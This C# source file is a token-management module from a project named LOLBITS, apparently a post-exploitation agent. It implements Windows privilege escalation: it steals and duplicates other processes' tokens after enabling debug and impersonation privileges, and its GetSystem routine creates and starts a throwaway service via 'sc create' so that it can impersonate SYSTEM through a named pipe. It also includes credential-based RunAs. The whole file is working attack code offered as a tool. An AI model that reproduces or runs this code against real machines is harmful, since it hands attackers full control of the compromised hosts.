using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Threading;

namespace LOLBITS.TokenManagement
{
    public class TokenManager
    {
        public static IntPtr Token; 
        public static int Method; // 1 = CreateProcessAsUser ; 2 = CreateProcessWithToken ; RunAs with valid credentials
        public static readonly string[] Credentials = new string[3]; // user - domain ('.' for local) - password 
        private static string _pipeName;
        private const int NumThreads = 1;
        private readonly SysCallManager sysCall;

        public TokenManager(SysCallManager sysCall)
        {
            Token = IntPtr.Zero;
            Method = 0;
            this.sysCall = sysCall;
        }

        public static void Rev2Self()
        {
            Token = IntPtr.Zero;
            Method = 0;
        }

        public bool Impersonate (int pid)
        {
            List<string> privileges = new List<string>
            {
                "SeDebugPrivilege",
                "SeImpersonatePrivilege",
                "SeTcbPrivilege",
                "SeAssignPrimaryTokenPrivilege",
                "SeIncreaseQuotaPrivilege"
            };
            
            try
            {
                Utils.GetProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TokenAdjustPrivileges,
                    out var token, sysCall);

                Utils.EnablePrivileges(token, privileges);

                Utils.GetProcessHandle(pid, out var handlePointer, Utils.ProcessAccessFlags.QueryInformation);

                Utils.GetProcessToken(handlePointer, Utils.TokenAccessFlags.TokenDuplicate, out var tokenPointer,
                    sysCall);

                Utils.CloseHandle(handlePointer);

                Utils.TokenAccessFlags tokenAccess =
                    Utils.TokenAccessFlags.TokenQuery | Utils.TokenAccessFlags.TokenAssignPrimary |
                    Utils.TokenAccessFlags.TokenDuplicate | Utils.TokenAccessFlags.TokenAdjustDefault |
                    Utils.TokenAccessFlags.TokenAdjustSessionId;

                Utils.DuplicateToken(tokenPointer, tokenAccess, Utils.SecurityImpersonationLevel.SecurityImpersonation,
                    Utils.TokenType.TokenPrimary, out var imptoken);

                Utils.StartupInfo startupInfo = new Utils.StartupInfo();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000001;

                Utils.ProcessInformation processInfo = new Utils.ProcessInformation();

                if (Method == 0)
                    Utils.DetermineImpersonationMethod(imptoken, new Utils.LogonFlags(), startupInfo, out processInfo);

                if (Method != 0)
                {
                    Token = imptoken;
                    return true;
                }
            }
            catch
            {

            }

            return false;
        }

        public static bool GetSystem()
        {
            _pipeName = Jobs.RandomString(7);
            bool exit = false;
            Thread server = new Thread(ServerThread);

            string cmd = "sc create NewDefaultService2 binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + _pipeName + "\"";
            Utils.ExecuteCommand(cmd);

            server.Start();
            Thread.Sleep(250);

            cmd = "sc start NewDefaultService2";
            Utils.ExecuteCommand(cmd);

            while (!exit)
            {
                if (server.Join(250))
                    exit = true;
            }

            if (Token != IntPtr.Zero)           
                return true;

            cmd = "sc delete NewDefaultService2";
            Utils.ExecuteCommand(cmd);

            return false;
        }

        private static void ServerThread(object data)
        {
            NamedPipeServerStream pipeServer = new NamedPipeServerStream(_pipeName, PipeDirection.InOut, NumThreads);
            int threadId = Thread.CurrentThread.ManagedThreadId;

            // Wait for a client to connect
            pipeServer.WaitForConnection();

            try
            {
                // Read the request from the client. Once the client has
                // written to the pipe its security token will be available.

                StreamString ss = new StreamString(pipeServer);

                string filename = ss.ReadString();
                Utils fileReader = new Utils();

                pipeServer.RunAsClient(Utils.Start);

                // Catch the IOException that is raised if the pipe is broken
                // or disconnected.
            }
            catch
            {

            }
            finally
            {
                pipeServer.Close();
            }
        }

        public static bool RunAs(string domain, string user, string password)
        {
            Utils.RunAs(domain, user, password);

            if (Method == 3)
                return true;

            return false;
        }
    }
}
